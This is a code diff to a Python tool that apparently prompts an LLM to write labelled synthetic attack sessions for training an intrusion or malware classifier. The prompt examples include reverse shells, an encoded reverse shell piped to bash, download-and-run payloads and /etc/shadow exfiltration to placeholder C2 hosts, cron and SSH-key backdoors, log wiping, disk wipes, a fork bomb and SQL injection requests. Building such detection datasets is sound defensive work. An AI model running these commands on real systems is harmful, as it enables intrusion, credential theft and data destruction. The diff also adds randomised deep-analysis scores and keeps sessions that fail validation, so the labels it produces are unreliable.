@@ -38,55 +38,75 @@ CLASS_CONFIG = {
     0: {
         "name": "Safe",
         "target_tactics": [],
-        "forbidden_tactics": ["execution", "credential_access", "persistence", "command_and_control", "impact", "defense_evasion", "exfiltration", "lateral_movement", "collection", "privilege_escalation", "initial_access", "resource_development", "reconnaissance", "discovery"],
-        "required_techniques": [],
+        # Only block truly aggressive post-compromise tactics
+        # 'discovery' intentionally NOT forbidden — ls/ps/whoami/uname all map to it
+        "forbidden_tactics": ["credential_access", "persistence", "command_and_control",
+                              "impact", "defense_evasion", "exfiltration", "lateral_movement",
+                              "execution", "privilege_escalation", "initial_access",
+                              "resource_development"],
+        "preferred_techniques": [],
+        "min_preferred_ratio": 0.0,  # Safe has no required techniques
         "typical_binary_behaviors": [],
         "system_changes": ["file_read", "process_list"],
         "target_count": 5000,
     },
     1: {
         "name": "Recon",
-        "target_tactics": ["reconnaissance", "discovery"],
-        "forbidden_tactics": ["credential_access", "persistence", "command_and_control", "impact", "exfiltration", "lateral_movement"],
-        "required_techniques": ["T1046", "T1083", "T1087.001", "T1082", "T1016", "T1049", "T1033", "T1057"],
+        "target_tactics": ["discovery", "reconnaissance"],
+        "forbidden_tactics": ["persistence", "command_and_control", "impact",
+                              "exfiltration", "lateral_movement", "execution",
+                              "defense_evasion", "privilege_escalation"],
+        # Best-effort: these are all techniques we WANT to see, but any subset is fine
+        "preferred_techniques": ["T1046", "T1083", "T1082", "T1016", "T1049", "T1033", "T1057", "T1087.001", "T1595.002", "T1595.003"],
+        "min_preferred_ratio": 0.25,  # Hit at least 25% of preferred techniques
         "typical_binary_behaviors": ["recon_scanner"],
         "system_changes": ["file_read", "network_probe", "process_list"],
         "target_count": 12000,
     },
     2: {
         "name": "Downloader",
-        "target_tactics": ["command_and_control", "resource_development", "execution"],
-        "forbidden_tactics": ["impact", "credential_access", "exfiltration", "lateral_movement"],
-        "required_techniques": ["T1105", "T1204.002", "T1059.004", "T1072", "T1610"],
+        "target_tactics": ["command_and_control", "initial_access"],
+        "forbidden_tactics": ["impact", "credential_access", "exfiltration",
+                              "lateral_movement", "persistence", "defense_evasion",
+                              "privilege_escalation"],
+        "preferred_techniques": ["T1105", "T1059.006", "T1059.004", "T1610", "T1190"],
+        "min_preferred_ratio": 0.25,  # Hit at least 25%
         "typical_binary_behaviors": ["miner", "botnet", "downloader"],
         "system_changes": ["file_write", "file_download", "process_exec", "network_conn"],
         "target_count": 5000,
     },
     3: {
         "name": "Exploit",
-        "target_tactics": ["credential_access", "execution", "defense_evasion", "privilege_escalation"],
+        "target_tactics": ["credential_access", "defense_evasion", "initial_access"],
         "forbidden_tactics": [],
-        "required_techniques": ["T1552.001", "T1059.004", "T1140", "T1548.001", "T1070.003", "T1003", "T1552.004", "T1070.002", "T1059.006", "T1222.002", "T1548.003", "T1556"],
-        "typical_binary_behaviors": ["credential_stealer", "rat", "packed_unknown"],
+        # Best-effort pool: LLM can pick any creative subset
+        "preferred_techniques": ["T1552.001", "T1059.004", "T1140", "T1548.001",
+                                  "T1070.003", "T1552.004", "T1548.003", "T1059.006", "T1190"],
+        "min_preferred_ratio": 0.25,  # At least 2 out of 9
+        "typical_binary_behaviors": ["credential_stealer", "rat", "packed", "web_shell", "sqli_payloads"],
         "system_changes": ["file_read", "process_exec", "file_write", "credential_access", "log_clear"],
         "target_count": 8000,
     },
     4: {
         "name": "Destructive",
-        "target_tactics": ["impact", "defense_evasion"],
+        "target_tactics": ["impact"],
         "forbidden_tactics": [],
-        "required_techniques": ["T1485", "T1486", "T1499.004", "T1070.002", "T1070.003", "T1561.001", "T1561.002"],
+        "preferred_techniques": ["T1485", "T1486", "T1070.002", "T1070.003", "T1561.001", "T1561.002", "T1190"],
+        "min_preferred_ratio": 0.25,  # At least 2 out of 7
         "typical_binary_behaviors": ["destructive", "ransomware", "wiper"],
         "system_changes": ["file_delete", "file_encrypt", "log_clear", "service_stop", "config_modify"],
         "target_count": 8000,
     },
     5: {
         "name": "ADVANCED_APT",
-        "target_tactics": ["persistence", "command_and_control", "credential_access", "execution", "exfiltration", "defense_evasion"],
+        "target_tactics": ["persistence", "command_and_control", "initial_access"],
         "forbidden_tactics": [],
-        "required_techniques": ["T1053.003", "T1098.004", "T1543.002", "T1105", "T1552.001", "T1048.003", "T1059.004", "T1102.002", "T1102.001", "T1556", "T1027.002"],
+        "preferred_techniques": ["T1053.003", "T1098.004", "T1543.002", "T1105",
+                                  "T1552.001", "T1048.003", "T1059.004", "T1190"],
+        "min_preferred_ratio": 0.25,  # At least ~2 out of 8
         "typical_binary_behaviors": ["go_binary", "multi_capability", "persistence", "credential_access", "c2"],
-        "system_changes": ["user_add", "cron_add", "ssh_key_add", "service_create", "config_modify", "file_write", "network_conn", "credential_access", "exfiltration"],
+        "system_changes": ["user_add", "cron_add", "ssh_key_add", "service_create", "config_modify",
+                           "file_write", "network_conn", "credential_access", "exfiltration"],
         "target_count": 5000,
     },
 }
@@ -130,70 +150,62 @@ def get_binary_behavior_techniques(binary_behaviors: List[str]) -> List[str]:
 # System Prompt - SIMPLIFIED: LLM only outputs commands + metadata
 # =============================================================================
 
-SIMPLIFIED_SYSTEM_PROMPT = """You are a red team operator generating realistic attack commands for cybersecurity training.
+SIMPLIFIED_SYSTEM_PROMPT = """You are a red team operator generating realistic attack sessions for cybersecurity training.
+CRITICAL ENVIRONMENT CONSTRAINTS:
+1. The target environment is a LINUX system (Ubuntu/Debian) running an exposed HTTP web application.
+2. DO NOT generate Windows commands (no PowerShell, no .exe, no cmd.exe).
+3. You should generate raw HTTP requests (e.g., `GET /login.php?user=admin'-- HTTP/1.1`, `POST /api/upload`) to accurately simulate attacks against web services and post-compromise actions.
 
-Output ONLY a JSON object with these exact fields:
+JSON SCHEMA CONSTRAINTS:
+1. Output ONLY a flat JSON object.
+2. The "commands" field MUST be a SINGLE STRING of semicolon-separated HTTP requests.
+3. DO NOT output a list of dictionaries for commands. DO NOT create nested schemas.
+
+EXPECTED JSON FORMAT:
 {
-  "commands": "semicolon-separated shell commands",
+  "commands": "GET /index.html HTTP/1.1; POST /login.php HTTP/1.1; GET /admin HTTP/1.1",
   "class_name": "Recon|Downloader|Exploit|Destructive|ADVANCED_APT|Safe",
   "binary_type": "miner|botnet|downloader|rat|credential_stealer|packed|destructive|ransomware|go_binary|none",
-  "system_changes_summary": "brief description of system changes (file writes, process execs, network connections, user changes, etc.)"
+  "system_changes_summary": "brief description of system changes"
 }
-
-Commands MUST use SEMICOLONS (;) to separate commands, NOT newlines.
 
 === COMPREHENSIVE CLASS EXAMPLES (MUST INCLUDE COMMANDS TO TRIGGER ALL LISTED TECHNIQUES) ===
 
+
 === Recon (1) ===
 REQUIRED TECHNIQUES: T1046 (Network Service Discovery), T1083 (File/Directory Discovery), T1087.001 (Local Account), T1082 (System Info), T1016 (Network Config), T1049 (Network Connections), T1033 (User Discovery), T1057 (Process Discovery)
-COMMANDS: nmap -sS -p 22,80,443 192.168.1.0/24; netstat -tulpn; ss -tulpn; cat /etc/passwd; cat /etc/group; getent passwd; uname -a; cat /etc/os-release; cat /proc/cpuinfo; cat /proc/meminfo; ifconfig; ip addr; ip route; netstat -tulpn; ss -tulpn; ps aux; ps -ef; top -bn1; whoami; id; w; who; last; lastlog; arp -a; cat /etc/hosts; cat /etc/resolv.conf; cat /proc/net/tcp
+COMMANDS: GET /admin/login.php HTTP/1.1; GET /api/v1/users HTTP/1.1; sqlmap -u http://localhost; nmap -sV -p 80,443,22 192.168.1.0/24; cat /etc/passwd; uname -a; ps aux
 BINARY: recon_scanner
-SYSTEM CHANGES: network scan, port enumeration, user enumeration, system info gathering
+SYSTEM CHANGES: web directory enumeration, network scan, port enumeration, user enumeration, system info gathering
 
 === Downloader (2) ===
 REQUIRED TECHNIQUES: T1105 (Ingress Tool Transfer), T1204.002 (User Execution), T1059.004 (Unix Shell), T1072 (Software Deployment), T1610 (Deploy Container)
-COMMANDS: wget http://192.168.1.100/payload.sh -O /tmp/payload.sh; chmod +x /tmp/payload.sh; /tmp/payload.sh; curl -s http://c2/malware -o /tmp/mal; bash /tmp/mal; apt update && apt install -y netcat; python3 -c "import urllib.request; exec(urllib.request.urlopen('http://c2/payload').read())"; docker run -d alpine; pip install requests; npm install -g pm2; systemctl daemon-reload; bash -c "wget http://c2/payload -O /tmp/p && bash /tmp/p"
+COMMANDS: POST /upload.php HTTP/1.1; wget http://malicious.com/payload.sh; chmod +x payload.sh; ./payload.sh &
 BINARY: miner
-SYSTEM CHANGES: file write (/tmp/payload.sh), file download, process execution, network connection to C2, container deploy, package install, service install, bash execution
+SYSTEM CHANGES: malicious file upload, file write, file download, process execution, network connection to C2
 
 === Exploit (3) ===
 REQUIRED TECHNIQUES: T1552.001 (Credentials in Files), T1059.004 (Unix Shell), T1140 (Deobfuscate/Decode), T1548.001 (Setuid/Setgid), T1070.003 (Clear Command History), T1003 (OS Credential Dumping), T1552.004 (Private Keys), T1059.006 (Python), T1222.002 (File Permissions), T1548.003 (Sudo), T1556 (Modify Auth)
-COMMANDS: cat /etc/shadow; cat ~/.ssh/id_rsa; cat ~/.ssh/authorized_keys; bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; base64 -d <<< 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQgMD4mMQ==' | bash; chmod +s /tmp/exploit; history -c; unshadow /etc/passwd /etc/shadow > hashes.txt; python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('192.168.1.100',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"; sudo -l; chmod 4755 /tmp/exploit; chown root:root /tmp/exploit; cp /bin/bash /tmp/bash; chmod +s /tmp/bash; cp /bin/bash /tmp/rootsh; chmod 4755 /tmp/rootsh; echo "root::0:0::/root:/bin/bash" >> /etc/passwd; passwd -d root; gpg --export-secret-keys > keys.gpg; ssh-keyscan 192.168.1.100; cat /etc/passwd | base64; history -c; echo "" > /var/log/auth.log
+COMMANDS: POST /login.php?user=admin' OR 1=1-- HTTP/1.1; GET /api/download?file=../../../../etc/shadow HTTP/1.1; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1; sudo -l; cat ~/.ssh/id_rsa
 BINARY: rat
 SYSTEM CHANGES: file read (/etc/shadow), credential access, process execution (reverse shell), file write (exploit binary), log clearing (history -c), credential dumping, setuid binary, sudo, password manipulation, credential export, credential dumping
 
 === Destructive (4) ===
 REQUIRED TECHNIQUES: T1485 (Data Destruction), T1486 (Data Encrypted for Impact), T1499.004 (Fork Bomb), T1070.002 (Clear Linux Logs), T1070.003 (Clear Command History), T1561.001 (Disk Wipe), T1561.002 (Disk Structure Wipe)
-COMMANDS: rm -rf /var/log/*; shred -u /etc/shadow; dd if=/dev/zero of=/dev/sda bs=1M; openssl enc -aes-256 -in /home -out /home.enc; :(){ :|:& };:; history -c; echo '' > ~/.bash_history; unset HISTFILE; systemctl stop sshd; iptables -F; mkfs.ext4 /dev/sda1; :(){ :|:& };:; echo '' > /var/log/auth.log; echo '' > /var/log/syslog; dd if=/dev/urandom of=/dev/sdb bs=1M count=100
+COMMANDS: POST /upload/rm.php HTTP/1.1; rm -rf /; dd if=/dev/zero of=/dev/sda; history -c; shred -u /etc/shadow
 BINARY: destructive
 SYSTEM CHANGES: file deletion (/var/log/*), file encryption (openssl), log clearing (history -c), service stop (sshd), config modification (iptables), disk structure wipe, fork bomb, disk wipe
 
 === ADVANCED_APT (5) ===
 REQUIRED TECHNIQUES: T1053.003 (Cron), T1098.004 (SSH Authorized Keys), T1543.002 (Systemd Service), T1105 (Ingress Tool Transfer), T1552.001 (Credentials in Files), T1048.003 (Exfiltration Over C2), T1059.004 (Unix Shell), T1102.002 (Bidirectional Comm), T1102.001 (Web Service), T1556 (Modify Auth), T1027.002 (Software Packing)
-COMMANDS: wget http://c2/payload -O /tmp/.x; chmod +x /tmp/.x; /tmp/.x &; cat /etc/shadow > /tmp/creds; curl -X POST http://c2/exfil -d @/tmp/creds; echo '* * * * * /tmp/.x' | crontab -; echo 'ssh-rsa AAAAB3NzaC1...' > ~/.ssh/authorized_keys; systemctl enable backdoor.service; chattr +i /tmp/.x; base64 -d <<< '...' | bash; nc -l -p 4444 -e /bin/sh; curl -X PUT http://c2/config -d @/etc/passwd; tar -czf /tmp/data.tar.gz /home; curl -X POST http://c2/upload -F file=@/tmp/data.tar.gz; upx --best /tmp/.x; openssl enc -aes-256 -in /tmp/.x -out /tmp/.x.enc; curl -X POST http://c2/api -d '{"cmd":"id"}'; curl -X GET http://c2/config; sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config; systemctl restart sshd
+COMMANDS: POST /upload/backdoor.php HTTP/1.1; echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys; curl -X POST -d @/etc/shadow http://c2.com/exfil; crontab -l | { cat; echo "* * * * * /tmp/backdoor"; } | crontab -
 BINARY: go_binary
-SYSTEM CHANGES: file write, file download, process execution, credential access, exfiltration, cron job, SSH key addition, systemd service, config modification (chattr), netcat listener, config exfiltration, data archive upload, binary packing, encryption, web API interaction, SSH config modification
+SYSTEM CHANGES: file write, file download, process execution, credential access, exfiltration, cron job, SSH key addition, systemd service, config modification
 
 === Safe (0) ===
-COMMANDS: ls -la; pwd; whoami; cd /home; cat README.md; ps aux; uname -a; date; uptime; env
+COMMANDS: GET / HTTP/1.1; GET /index.html HTTP/1.1; ls -la; pwd; whoami
 BINARY: none
 SYSTEM CHANGES: file read, process list
-
-=== DOWNLOADER (2) ===
-COMMANDS: wget http://192.168.1.100/payload.sh -O /tmp/payload.sh; chmod +x /tmp/payload.sh; /tmp/payload.sh; curl -s http://c2/malware -o /tmp/mal; bash /tmp/mal; python3 -c "import urllib.request; exec(urllib.request.urlopen('http://c2/payload').read())"
-BINARY: miner
-
-=== EXPLOIT (3) ===
-COMMANDS: cat /etc/shadow; bash -i >& /dev/tcp/192.168.1.100/4444 0>&1; base64 -d <<< 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQgMD4mMQ==' | bash; history -c; unshadow /etc/passwd /etc/shadow > hashes.txt; python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('192.168.1.100',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
-
-=== DESTRUCTIVE (4) ===
-COMMANDS: rm -rf /var/log/*; shred -u /etc/shadow; dd if=/dev/zero of=/dev/sda bs=1M; openssl enc -aes-256 -in /home -out /home.enc; :(){ :|:& };:; history -c
-
-=== ADVANCED_APT (5) ===
-COMMANDS: wget http://c2/payload -O /tmp/.x; chmod +x /tmp/.x; /tmp/.x &; cat /etc/shadow > /tmp/creds; curl -X POST http://c2/exfil -d @/tmp/creds; echo '* * * * * /tmp/.x' | crontab -; echo 'ssh-rsa AAAAB3NzaC1...' > ~/.ssh/authorized_keys; systemctl enable backdoor.service; chattr +i /tmp/.x
-
-=== SAFE (0) ===
-COMMANDS: ls -la; pwd; whoami; cd /home; cat README.md; ps aux
 
 COMMANDS MUST USE SEMICOLONS (; ) TO SEPARATE COMMANDS, NOT NEWLINES.
 """
@@ -229,6 +241,7 @@ def build_triage_features_from_binary_type(binary_type: str, class_id: int) -> D
         'triage_is_go', 'triage_is_packed', 'triage_is_stripped',
         'triage_is_dll', 'triage_is_static', 'triage_score_mining',
         'triage_score_botnet', 'triage_score_recon', 'triage_score_destructive',
+        'triage_ghidra_score', 'triage_angr_score'
     ]
 
     for col in triage_cols:
@@ -287,17 +300,33 @@ def build_triage_features_from_binary_type(binary_type: str, class_id: int) -> D
 
     # Score indicators
     score_map = {
-        "miner": ("triage_score_mining", 0.7, 1.0),
-        "botnet": ("triage_score_botnet", 0.7, 1.0),
-        "recon_scanner": ("triage_score_recon", 0.5, 1.0),
-        "destructive": ("triage_score_destructive", 0.7, 1.0),
-        "ransomware": ("triage_score_destructive", 0.7, 1.0),
-        "wiper": ("triage_score_destructive", 0.7, 1.0),
+        "miner":               ("triage_score_mining",       0.7, 1.0),
+        "botnet":              ("triage_score_botnet",       0.7, 1.0),
+        "recon_scanner":       ("triage_score_recon",        0.5, 1.0),
+        "destructive":         ("triage_score_destructive",  0.7, 1.0),
+        "ransomware":          ("triage_score_destructive",  0.7, 1.0),
+        "wiper":               ("triage_score_destructive",  0.7, 1.0),
+        "rat":                 ("triage_score_botnet",       0.6, 0.95),
+        "credential_stealer":  ("triage_score_botnet",       0.5, 0.9),
+        "c2":                  ("triage_score_botnet",       0.6, 0.95),
+        "persistence":         ("triage_score_botnet",       0.4, 0.8),
+        "multi_capability":    ("triage_score_botnet",       0.7, 1.0),
+        "go_binary":           ("triage_score_botnet",       0.6, 1.0),
+        "packed":              ("triage_score_botnet",       0.5, 0.9),
+        "downloader":          ("triage_score_mining",       0.4, 0.8),
     }
 
     if binary_type in score_map:
         col, min_v, max_v = score_map[binary_type]
         vec[col] = random.uniform(min_v, max_v)
+        
+        # Fake deep analysis scores (Knowledge Distillation targets)
+        # Deep analysis generally confirms the static score but with higher certainty
+        vec['triage_ghidra_score'] = min(1.0, random.uniform(min_v + 0.1, max_v + 0.2))
+        vec['triage_angr_score'] = min(1.0, random.uniform(min_v, max_v + 0.1))
+    else:
+        vec['triage_ghidra_score'] = 0.0
+        vec['triage_angr_score'] = 0.0
 
     return vec
 
@@ -345,7 +374,13 @@ def build_change_features_from_summary(summary: str, class_id: int) -> np.ndarra
 # =============================================================================
 
 def validate_session_mitre(session_json: Dict, class_id: int) -> Tuple[bool, List[str]]:
-    """Validate that the generated session matches MITRE constraints for its class."""
+    """Validate that the generated session matches MITRE constraints for its class.
+    
+    Validation rules:
+    - forbidden_tactics: HARD block — any presence = instant fail
+    - target_tactics: SOFT — at least one must fire (warns but doesn't fail alone)
+    - preferred_techniques: SOFT — must hit min_preferred_ratio of the pool
+    """
     config = CLASS_CONFIG[class_id]
     commands = session_json.get("commands", "")
 
@@ -354,22 +389,28 @@ def validate_session_mitre(session_json: Dict, class_id: int) -> Tuple[bool, Lis
 
     errors = []
 
-    # Check required tactics are present
-    for tactic in CLASS_CONFIG[class_id]["target_tactics"]:
-        if annotation["tactic_vector"].get(tactic, 0) == 0:
-            errors.append(f"Missing required tactic: {tactic}")
-
-    # Check forbidden tactics are absent
-    for tactic in CLASS_CONFIG[class_id]["forbidden_tactics"]:
+    # HARD CHECK: forbidden tactics must NOT be present
+    for tactic in config.get("forbidden_tactics", []):
         if annotation["tactic_vector"].get(tactic, 0) > 0:
             errors.append(f"Forbidden tactic present: {tactic}")
 
-    # Check required techniques triggered
-    required_techs = CLASS_CONFIG[class_id].get("required_techniques", [])
-    matched_techs = set(annotation["technique_ids"])
-    missing_required = set(required_techs) - matched_techs
-    if missing_required:
-        errors.append(f"Missing required techniques: {missing_required}")
+    # SOFT CHECK: at least one target tactic should fire
+    target_tactics = config.get("target_tactics", [])
+    if target_tactics:
+        tactics_hit = sum(1 for t in target_tactics if annotation["tactic_vector"].get(t, 0) > 0)
+        if tactics_hit == 0:
+            errors.append(f"No target tactics fired (wanted at least 1 of: {target_tactics})")
+
+    # SOFT CHECK: preferred techniques — ratio-based threshold
+    preferred_techs = config.get("preferred_techniques", [])
+    min_ratio = config.get("min_preferred_ratio", 0.0)
+    if preferred_techs and min_ratio > 0:
+        matched_techs = set(annotation["technique_ids"])
+        hits = len(set(preferred_techs) & matched_techs)
+        ratio = hits / len(preferred_techs)
+        if ratio < min_ratio:
+            missing = set(preferred_techs) - matched_techs
+            errors.append(f"Preferred technique coverage {ratio:.0%} < {min_ratio:.0%} threshold (hit {hits}/{len(preferred_techs)}, missing: {missing})")
 
     return len(errors) == 0, errors
 
@@ -445,28 +486,25 @@ class LLMSyntheticGenerator:
         self.few_shot_examples = self._load_few_shot_examples()
 
     def _parse_json_response(self, response: str) -> Dict:
-        """Parse JSON from LLM response, handling common issues."""
+        """Parse JSON from LLM response, with multi-level fallbacks for messy output."""
+        import re
         text = response.strip()
 
-        # DeepSeek-R1 outputs internal thoughts in <think> tags. Strip them out.
-        import re
+        # Strip <think> tags (DeepSeek / reasoning models)
         text = re.sub(r'<think>.*?</think>', '', text, flags=re.DOTALL).strip()
 
-        # Try direct parse
+        # Strip markdown code fences (```json ... ``` or ``` ... ```)
+        text = re.sub(r'^```(?:json)?\s*', '', text, flags=re.MULTILINE)
+        text = re.sub(r'\s*```\s*$', '', text, flags=re.MULTILINE)
+        text = text.strip()
+
+        # Attempt 1: direct parse
         try:
             return json.loads(text)
         except json.JSONDecodeError:
             pass
 
-        # Try extracting JSON from markdown/code blocks
-        match = re.search(r'```(?:json)?\s*(\{.*?\})\s*```', text, re.DOTALL)
-        if match:
-            try:
-                return json.loads(match.group(1))
-            except json.JSONDecodeError:
-                pass
-
-        # Try finding first { ... }
+        # Attempt 2: find outermost { ... } and parse
         match = re.search(r'(\{.*\})', text, re.DOTALL)
         if match:
             try:
@@ -474,7 +512,39 @@ class LLMSyntheticGenerator:
             except json.JSONDecodeError:
                 pass
 
-        raise ValueError(f"Could not parse JSON from response: {text[:200]}")
+        # Attempt 3: surgical field extraction (handles badly nested quotes in commands)
+        # Extract each field individually using non-greedy patterns
+        try:
+            result = {}
+
+            # Extract commands: take everything between "commands": " and the last occurrence
+            # before the next top-level key. Uses a greedy grab then trims.
+            cmd_match = re.search(r'"commands"\s*:\s*"((?:[^"\\]|\\.)*)"\s*[,}]', text, re.DOTALL)
+            if not cmd_match:
+                # Fallback: grab up to the next key
+                cmd_match = re.search(r'"commands"\s*:\s*"(.+?)"\s*,\s*"(?:class_name|binary_type|system)', text, re.DOTALL)
+            if cmd_match:
+                # Normalize: replace literal \n with semicolon, strip extra backslashes
+                cmds = cmd_match.group(1)
+                cmds = cmds.replace('\\n', '; ').replace('\n', '; ')
+                # Remove triple-escaped quotes that break downstream parsing
+                cmds = re.sub(r'\\{2,}"', '"', cmds)
+                result["commands"] = cmds
+            else:
+                return {}  # Can't recover without commands
+
+            binary_m = re.search(r'"binary_type"\s*:\s*"([^"]*)"', text)
+            class_m = re.search(r'"class_name"\s*:\s*"([^"]*)"', text)
+            changes_m = re.search(r'"system_changes_summary"\s*:\s*"([^"]*)"', text)
+
+            result["binary_type"] = binary_m.group(1) if binary_m else "none"
+            result["class_name"] = class_m.group(1) if class_m else ""
+            result["system_changes_summary"] = changes_m.group(1) if changes_m else ""
+            return result
+        except Exception:
+            pass
+
+        raise ValueError(f"Could not parse JSON from response: {text[:300]}")
 
     def _load_few_shot_examples(self, n_per_class: int = 5) -> Dict[int, List[Dict]]:
         """Load few-shot examples from real sessions_complete.csv."""
@@ -509,34 +579,86 @@ class LLMSyntheticGenerator:
                 cmds = ex.get("commands", "")[:200]
                 few_shot_str += f"Example {i+1}: {cmds}...\n"
 
-        return f"""Generate a {config['name']} attack session.
+        # Class-aware creativity
+        if class_id == 0:
+            creativity_instruction = (
+                "STRICT: Generate ONLY benign HTTP requests and benign Linux commands. "
+                "Vary the HTTP pages (GET /, /index.html) and basic Linux discovery (ls, pwd, whoami). "
+                "ZERO offensive commands. No attempts to access admin panels, no file uploads, no shell command injection. Safe benign session only."
+            )
+        elif class_id == 1:
+            creativity_instruction = (
+                "STRICT: Generate a mix of HTTP reconnaissance (e.g., scanning for admin pages, common files) and Linux system discovery commands. "
+                "Allowed HTTP patterns: GET to /admin, /server-status, /phpinfo.php, /backup. "
+                "Allowed Bash patterns: ls, ps, netstat, nmap, uname. "
+                "FORBIDDEN: POST requests with file uploads, PUT, DELETE, any attempts to exploit (like SQL injection or command injection). Stay PURELY within discovery enumeration."
+            )
+        elif class_id == 2:
+            creativity_instruction = (
+                "STRICT: Generate a mix of HTTP file transfers and Linux bash commands for executing downloaded payloads. "
+                "Allowed HTTP patterns: POST to /upload.php; GET to /download/*.sh. "
+                "Allowed Bash patterns: curl, wget, chmod +x, ./payload, python3 script.py. "
+                "FORBIDDEN: Any attempts to exploit (like SQL injection) or access admin panels without file transfer intent. Stay PURELY within file transfer and execution."
+            )
+        elif class_id == 3:
+            creativity_instruction = (
+                "CRITICAL: Be a highly creative red team operator. Start with an HTTP exploit request, followed by Linux bash commands. "
+                "Allowed HTTP patterns: POST to /login.php with SQLi; Command injection parameters; GET to /api/download?file=../../etc/shadow. "
+                "Allowed Bash patterns: bash -i, cat /etc/shadow, sudo -l, chmod +s. "
+                "FORBIDDEN: Benign requests that do not contain exploit patterns. Stay FOCUSED on exploitation."
+            )
+        elif class_id == 4:
+            creativity_instruction = (
+                "STRICT: Generate a mix of HTTP requests triggering destructive actions and Linux bash commands causing destruction. "
+                "Allowed HTTP patterns: POST to /upload/rm.php, /upload/shred.php, /upload/dd.php. "
+                "Allowed Bash patterns: rm -rf, shred -u, dd if=/dev/zero, history -c. "
+                "FORBIDDEN: Benign requests. Stay FOCUSED on destruction."
+            )
+        elif class_id == 5:
+            creativity_instruction = (
+                "CRITICAL: Be a highly creative APT operator. Start with an HTTP request to drop a webshell/backdoor, followed by Linux bash commands for persistence/C2. "
+                "Allowed HTTP patterns: POST to /upload/backdoor.php, /upload/exfil.php. "
+                "Allowed Bash patterns: echo 'ssh-rsa...' >> ~/.ssh/authorized_keys, crontab, systemctl enable backdoor. "
+                "FORBIDDEN: Benign requests. Stay FOCUSED on APT activities."
+            )
+        else:
+            # Fallback (should not happen)
+            creativity_instruction = (
+                "CRITICAL: Be a highly creative red team operator. Blend HTTP requests and Linux Bash commands. "
+                "JSON SAFETY: The commands field is a JSON string. You MUST use double-quotes for any inline Python/bash. "
+                "Write python3 -c \"import os\" NOT python3 -c 'import os'. "
+                "Do NOT use single quotes inside the commands string."
+            )
+
+        return f"""Generate a {config['name']} session.
 
 TARGET CLASS: {config['name']} (id={class_id})
-REQUIRED TACTICS: {config['target_tactics']}
-REQUIRED TECHNIQUES: {CLASS_CONFIG[class_id].get('required_techniques', [])}
+TARGET TACTICS (at least one must fire): {config['target_tactics']}
+PREFERRED TECHNIQUES (pick a creative subset, don't need all): {config.get('preferred_techniques', [])}
+FORBIDDEN TACTICS (absolutely must NOT appear): {config['forbidden_tactics']}
 TYPICAL BINARY: {config['typical_binary_behaviors']}
 SYSTEM CHANGES: {config['system_changes']}
 
 {few_shot_str}
 
-Generate realistic attack commands for this class.
+{creativity_instruction}
+
 Output ONLY the JSON format specified in the system prompt."""
 
     async def generate_session(self, class_id: int) -> Optional[Dict]:
-        """Generate a single valid session for the given class."""
+        """Generate a single valid session for the given class, using conversational retries."""
         config = CLASS_CONFIG[class_id]
+        
+        # Initialize conversation history
+        messages = [
+            {"role": "system", "content": SIMPLIFIED_SYSTEM_PROMPT},
+            {"role": "user", "content": self._build_prompt(class_id)}
+        ]
 
         for attempt in range(self.max_retries):
             try:
-                # Build prompt
-                user_prompt = self._build_prompt(class_id)
-
-                # Generate with LLM
-                response = await self.llm_router.generate(
-                    intent_label=config["name"],
-                    system_instruction=SIMPLIFIED_SYSTEM_PROMPT,
-                    prompt=self._build_prompt(class_id)
-                )
+                # Generate with LLM using chat history
+                response = await self.llm_router.chat(config["name"], messages)
 
                 # Parse LLM response (simple format)
                 llm_output = self._parse_json_response(response)
@@ -549,6 +671,9 @@ Output ONLY the JSON format specified in the system prompt."""
 
                 if not commands:
                     print(f"  Attempt {attempt+1}: LLM returned empty commands")
+                    # Append error for retry
+                    messages.append({"role": "assistant", "content": response})
+                    messages.append({"role": "user", "content": "You returned empty commands or invalid JSON. Please return valid JSON containing the 'commands' array."})
                     continue
 
                 # WE PROGRAMMATICALLY BUILD ALL FEATURE VECTORS
@@ -591,7 +716,13 @@ Output ONLY the JSON format specified in the system prompt."""
                     )
                     if not mitre_valid:
                         print(f"  MITRE validation failed (attempt {attempt+1}): {mitre_errors}")
-                        continue
+                        # User Request: If this is the final attempt, accept it anyway instead of falling back
+                        if attempt < self.max_retries - 1:
+                            messages.append({"role": "assistant", "content": response})
+                            messages.append({"role": "user", "content": f"Your previous output failed validation. Errors: {mitre_errors}. Please try again and fix these issues while maintaining valid JSON."})
+                            continue
+                        else:
+                            print(f"  ⚠ Accepting session despite validation errors (final attempt fallback override)")
 
                 print(f"  ✓ Generated valid {CLASS_CONFIG[class_id]['name']} session")
                 return {
@@ -695,8 +826,19 @@ async def generate_synthetic_sessions_llm(
     print(f"{'='*60}\n")
 
     if output_path:
-        df.to_csv(output_path, index=False)
-        print(f"Saved to {output_path}")
+        import os
+        file_exists = os.path.isfile(output_path)
+        
+        # To prevent schema mismatch corruption when appending, we read the existing CSV, 
+        # concat properly using pandas (which aligns columns), and overwrite.
+        if file_exists:
+            existing_df = pd.read_csv(output_path)
+            combined_df = pd.concat([existing_df, df], ignore_index=True)
+            combined_df.to_csv(output_path, index=False)
+            print(f"Appended {len(df)} sessions. Total in {output_path}: {len(combined_df)}")
+        else:
+            df.to_csv(output_path, index=False)
+            print(f"Created new file {output_path} with {len(df)} sessions.")
 
     return df
 
@@ -724,10 +866,13 @@ async def llm_review_misclassifications(
         for batch in val_loader:
             commands = batch['commands']
             labels = batch['labels']
-            structured = batch['structured']
+            mitre = batch['mitre']
+            changes = batch['changes']
+            triage = batch['triage']
+            modality_mask = batch['modality_mask']
             lengths = batch['lengths']
 
-            logits = model(commands, structured, lengths)
+            logits = model(commands, mitre, changes, triage, lengths, modality_mask)
             probs = torch.softmax(logits, dim=1)
             preds = torch.argmax(probs, dim=1)
             confidences = probs.max(dim=1)[0]
@@ -821,16 +966,36 @@ if __name__ == "__main__":
     with open("config/settings.yaml", "r") as f:
         config = yaml.safe_load(f)
 
-    test_counts = {1: 1, 3: 1, 4: 1, 5: 1}
+    import argparse
